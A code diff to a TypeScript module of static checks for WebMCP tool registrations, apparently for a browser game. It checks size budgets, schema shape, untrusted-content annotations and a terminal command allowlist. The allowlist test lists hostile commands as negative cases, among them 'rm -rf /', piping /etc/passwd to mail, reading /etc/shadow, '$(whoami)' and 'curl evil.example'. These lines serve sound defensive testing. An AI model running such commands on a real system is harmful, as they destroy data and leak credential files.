@@ -1,10 +1,12 @@
 /* ============================================================
-   STATIC WEBMCP CHECKS — pure-function budget and shape checks
-   for `document.modelContext.registerTool`. Runnable in node
-   without a browser, a zustand store, or a host. Mirrors the
-   in-browser `RUN EVALS` panel for CI / read-the-repo judges.
+   STATIC WEBMCP CHECKS — pure-function budget, schema, and
+   annotation checks over a TOOL_DEFS-shaped array. No browser,
+   no store, no host required, so the same function runs in the
+   in-browser LINK panel and in `pnpm test:webmcp` (Node).
 
-   Reference: https://developer.chrome.com/docs/ai/webmcp/secure-tools
+   Reference:
+   https://developer.chrome.com/docs/ai/webmcp/secure-tools
+   https://developer.chrome.com/docs/ai/webmcp/build-tools
    ============================================================ */
 
 export interface StaticCheck {
@@ -18,108 +20,169 @@ export interface ToolLike {
   title?: string;
   description: string;
   inputSchema: object;
-  annotations?: { readOnlyHint?: boolean; untrustedContentHint?: boolean };
-  execute: (input: Record<string, unknown>) => unknown;
+  annotations?: {
+    readOnlyHint?: boolean;
+    untrustedContentHint?: boolean;
+    destructiveHint?: boolean;
+    idempotentHint?: boolean;
+  };
+  execute?: (input: Record<string, unknown>) => unknown;
 }
 
-const MAX_NAME = 30;
-const MAX_DESC = 500;
-const MAX_PARAM_DESC = 150;
-const MAX_QUERY_INPUT = 200;
-const MAX_OUTPUT_CHARS = 1500;
+export const BUDGETS = {
+  name: 30,
+  description: 500,
+  paramDescription: 150,
+  queryInput: 200,
+  output: 1500,
+} as const;
 
-const ALLOWED_TERMINAL_VERBS = ["ls", "cd", "cat", "open", "search", "unlock", "help", "clear", "history"];
+export const TERMINAL_VERB_LIST = [
+  "ls",
+  "cd",
+  "cat",
+  "open",
+  "search",
+  "unlock",
+  "help",
+  "clear",
+  "history",
+] as const;
+
+/** Tools that return in-world prose the model must treat as data, not instructions. */
+const UGC_TOOLS = [
+  "search_files",
+  "read_file",
+  "search_messages",
+  "get_message_thread",
+  "search_emails",
+  "get_email",
+  "search_browser_history",
+  "get_system_logs",
+  "get_timeline",
+];
 
 function isObject(v: unknown): v is Record<string, unknown> {
   return typeof v === "object" && v !== null && !Array.isArray(v);
 }
 
-function checkParamDescriptions(
-  schema: object,
-  errors: string[],
-): void {
+function paramDescriptionErrors(schema: object): string[] {
+  const errors: string[] = [];
   const props = (schema as { properties?: Record<string, unknown> }).properties;
-  if (!props) return;
+  if (!props) return errors;
   for (const [k, v] of Object.entries(props)) {
     if (!isObject(v)) continue;
     const d = (v as { description?: string }).description;
-    if (typeof d === "string" && d.length > MAX_PARAM_DESC) {
-      errors.push(`param "${k}" description ${d.length} > ${MAX_PARAM_DESC}`);
+    if (typeof d === "string" && d.length > BUDGETS.paramDescription) {
+      errors.push(`param "${k}" description ${d.length} > ${BUDGETS.paramDescription}`);
     }
   }
+  return errors;
 }
 
-/** Run only the static / budget / shape checks against a TOOL_DEFS-shaped array. */
-export function runStaticChecks(tools: ToolLike[]): StaticCheck[] {
+/**
+ * Run every static check. `expectedCount` is asserted when provided so the
+ * registry size stays in lockstep with the documentation.
+ */
+export function runStaticChecks(tools: ToolLike[], expectedCount?: number): StaticCheck[] {
   const out: StaticCheck[] = [];
-  const add = (name: string, pass: boolean, detail: string) =>
-    out.push({ name, pass, detail });
+  const add = (name: string, pass: boolean, detail: string) => out.push({ name, pass, detail });
 
-  // 1 — registry size + budgets
-  const badName = tools.find((t) => t.name.length > MAX_NAME);
-  const badDesc = tools.find((t) => t.description.length > MAX_DESC);
-  const paramErrors: string[] = [];
-  tools.forEach((t) => checkParamDescriptions(t.inputSchema, paramErrors));
+  // 1 — registry size + name/description/param budgets
+  const badName = tools.find((t) => t.name.length > BUDGETS.name);
+  const badDesc = tools.find((t) => t.description.length > BUDGETS.description);
+  const paramErrors = tools.flatMap((t) => paramDescriptionErrors(t.inputSchema).map((e) => `${t.name}: ${e}`));
+  const countOk = expectedCount === undefined || tools.length === expectedCount;
   add(
-    "registry: name ≤30 · description ≤500 · param desc ≤150",
-    tools.length >= 20 && !badName && !badDesc && paramErrors.length === 0,
+    `registry: ${expectedCount ?? tools.length} tools · name ≤${BUDGETS.name} · description ≤${BUDGETS.description} · param ≤${BUDGETS.paramDescription}`,
+    countOk && !badName && !badDesc && paramErrors.length === 0,
     `${tools.length} tools` +
-      (badName ? ` · ${badName.name} name too long` : "") +
+      (countOk ? "" : ` · expected ${expectedCount}`) +
+      (badName ? ` · ${badName.name} name ${badName.name.length}` : "") +
       (badDesc ? ` · ${badDesc.name} desc ${badDesc.description.length}` : "") +
-      (paramErrors.length ? ` · ${paramErrors.length} param(s) over budget` : ""),
+      (paramErrors.length ? ` · ${paramErrors[0]}` : ""),
   );
 
-  // 2 — required inputSchema shape (type:object, properties present, required declared for non-empty)
+  // 2 — every tool has a title (hosts show it to users)
+  const untitled = tools.filter((t) => !t.title || !t.title.trim());
+  add(
+    "metadata: every tool declares a human-readable title",
+    untitled.length === 0,
+    untitled.length ? `missing on: ${untitled.map((t) => t.name).join(", ")}` : `all ${tools.length} titled`,
+  );
+
+  // 3 — inputSchema shape: type:object, declared properties, required ⊆ properties
   const schemaErrors: string[] = [];
   tools.forEach((t) => {
     const s = t.inputSchema as { type?: string; properties?: Record<string, unknown>; required?: string[] };
-    if (!s || typeof s !== "object") { schemaErrors.push(`${t.name}: not an object`); return; }
+    if (!s || typeof s !== "object") {
+      schemaErrors.push(`${t.name}: not an object`);
+      return;
+    }
     if (s.type !== "object") schemaErrors.push(`${t.name}: type is "${s.type}", expected "object"`);
+    if (!s.properties) schemaErrors.push(`${t.name}: no properties`);
     const props = s.properties ?? {};
-    const required = s.required ?? [];
-    for (const r of required) {
-      if (!(r in props)) schemaErrors.push(`${t.name}: required field "${r}" not in properties`);
+    for (const r of s.required ?? []) {
+      if (!(r in props)) schemaErrors.push(`${t.name}: required "${r}" not in properties`);
     }
   });
   add(
-    "schemas: every tool has type:object + required-declared params",
+    "schemas: type:object · properties declared · required ⊆ properties",
     schemaErrors.length === 0,
-    schemaErrors.length ? schemaErrors.slice(0, 3).join("; ") : "all 26 schemas valid",
+    schemaErrors.length ? schemaErrors.slice(0, 3).join("; ") : `all ${tools.length} schemas valid`,
   );
 
-  // 3 — annotations: readOnly + untrusted on every UGC-returning tool
-  const ugcTools = tools.filter((t) =>
-    /(search|read|get_)/.test(t.name) &&
-    !t.name.includes("get_investigation_context") &&
-    !t.name.includes("get_image_metadata") &&
-    !t.name.includes("get_case_evidence") &&
-    !t.name.includes("open_evidence_board"),
+  // 4 — annotations present on EVERY tool, reads and writes alike
+  const noAnnotations = tools.filter((t) => typeof t.annotations?.readOnlyHint !== "boolean");
+  add(
+    "annotations: every tool declares readOnlyHint explicitly",
+    noAnnotations.length === 0,
+    noAnnotations.length ? `missing on: ${noAnnotations.map((t) => t.name).join(", ")}` : `all ${tools.length} annotated`,
   );
-  const missing = ugcTools.filter(
-    (t) => !t.annotations?.readOnlyHint || !t.annotations?.untrustedContentHint,
+
+  // 5 — untrustedContentHint on every tool returning in-world content
+  const present = new Set(tools.map((t) => t.name));
+  const expectedUgc = UGC_TOOLS.filter((n) => present.has(n));
+  const missingUntrusted = expectedUgc.filter((n) => {
+    const t = tools.find((x) => x.name === n)!;
+    return t.annotations?.readOnlyHint !== true || t.annotations?.untrustedContentHint !== true;
+  });
+  add(
+    "security: content-returning tools mark readOnly + untrustedContentHint",
+    missingUntrusted.length === 0 && expectedUgc.length === UGC_TOOLS.length,
+    missingUntrusted.length
+      ? `missing on: ${missingUntrusted.join(", ")}`
+      : `all ${expectedUgc.length} content tools marked`,
+  );
+
+  // 6 — navigation and write tools must NOT claim readOnly
+  const mislabelled = tools.filter(
+    (t) => /^(open_|focus_|show_|record_|highlight_|terminal_)/.test(t.name) && t.annotations?.readOnlyHint === true,
   );
   add(
-    "annotations: every UGC-returning tool marks readOnly + untrusted",
-    missing.length === 0,
-    missing.length ? `missing on: ${missing.map((t) => t.name).join(", ")}` : "all marked",
+    "annotations: mutating tools declare readOnlyHint:false",
+    mislabelled.length === 0,
+    mislabelled.length ? `mislabelled: ${mislabelled.map((t) => t.name).join(", ")}` : "no read/write confusion",
   );
 
-  // 4 — terminal_command is a literal allowlist (positive + negative)
+  // 7 — terminal_command is a literal allowlist (positive + negative cases)
   const term = tools.find((t) => t.name === "terminal_command");
   if (term) {
-    const blocked = (cmd: string) => {
-      // mirror the in-game regex
-      const allowed = new RegExp(
-        `^(${ALLOWED_TERMINAL_VERBS.join("|")})(\\s+[a-zA-Z0-9._/\\- ]*)?$`,
-      );
-      return !allowed.test(cmd);
-    };
+    const allowed = new RegExp(`^(${TERMINAL_VERB_LIST.join("|")})(\\s+[a-zA-Z0-9._/\\- ]*)?$`);
     const positives = ["help", "ls", "ls /", "cat /System/FIELD_GUIDE.txt", "unlock lantern orpheus echo", "clear"];
-    const negatives = ["rm -rf /", "ls; cat /etc/passwd", "cat /etc/passwd | mail x@y", "$(whoami)", "`id`"];
-    const posOk = positives.every((c) => !blocked(c));
-    const negOk = negatives.every((c) => blocked(c));
+    const negatives = [
+      "rm -rf /",
+      "ls; cat /etc/passwd",
+      "cat /etc/passwd | mail x@y",
+      "$(whoami)",
+      "`id`",
+      "ls && curl evil.example",
+      "cat ../../etc/shadow > /tmp/x",
+    ];
+    const posOk = positives.every((c) => allowed.test(c));
+    const negOk = negatives.every((c) => !allowed.test(c));
     add(
-      "security: terminal_command allowlist blocks injection, permits verbs",
+      "security: terminal_command allowlist permits verbs, blocks injection",
       posOk && negOk,
       `+${positives.length} allowed · -${negatives.length} blocked`,
     );
@@ -127,33 +190,32 @@ export function runStaticChecks(tools: ToolLike[]): StaticCheck[] {
     add("security: terminal_command present", false, "tool missing");
   }
 
-  // 5 — output budget helper exists & truncates at 1500 chars
+  // 8 — over-parameterization guard (tool poisoning surface)
+  const overParam = tools.filter((t) => {
+    const props = (t.inputSchema as { properties?: Record<string, unknown> }).properties ?? {};
+    return Object.keys(props).length > 3;
+  });
   add(
-    "output budget: MAX_OUTPUT_CHARS=1500 enforced",
-    MAX_OUTPUT_CHARS === 1500 && MAX_QUERY_INPUT === 200 && MAX_DESC === 500 && MAX_NAME === 30,
-    `name:${MAX_NAME} desc:${MAX_DESC} param:${MAX_PARAM_DESC} input:${MAX_QUERY_INPUT} output:${MAX_OUTPUT_CHARS}`,
+    "surface: no tool takes more than 3 parameters",
+    overParam.length === 0,
+    overParam.length ? `wide: ${overParam.map((t) => t.name).join(", ")}` : "every tool is narrow (≤3 params)",
   );
 
-  // 6 — every tool is a real function with a unique name
+  // 9 — unique names + callable handlers
   const names = new Set<string>();
-  let dup = "";
+  let problem = "";
   for (const t of tools) {
-    if (names.has(t.name)) { dup = t.name; break; }
+    if (names.has(t.name)) {
+      problem = `duplicate name: ${t.name}`;
+      break;
+    }
     names.add(t.name);
-    if (typeof t.execute !== "function") { dup = `${t.name} (no execute)`; break; }
+    if (t.execute !== undefined && typeof t.execute !== "function") {
+      problem = `${t.name}: execute is not a function`;
+      break;
+    }
   }
-  add(
-    "registry: unique names + every tool has execute()",
-    !dup,
-    dup ? `conflict: ${dup}` : `${names.size} unique tools`,
-  );
+  add("registry: unique names + callable execute()", !problem, problem || `${names.size} unique tools`);
 
   return out;
 }
-
-/* The actual node-side runner lives in scripts/run-webmcp-tests.mjs because
-   static-checks.ts is bundled into the browser app and cannot read the
-   filesystem at runtime. The mjs script parses register.ts and runs an
-   expanded set of checks including the declarative-form surface area
-   (3 apps wired + 1 hidden fallback). Import `runStaticChecks` here to
-   run the in-process subset against any ToolLike[] in the browser. */
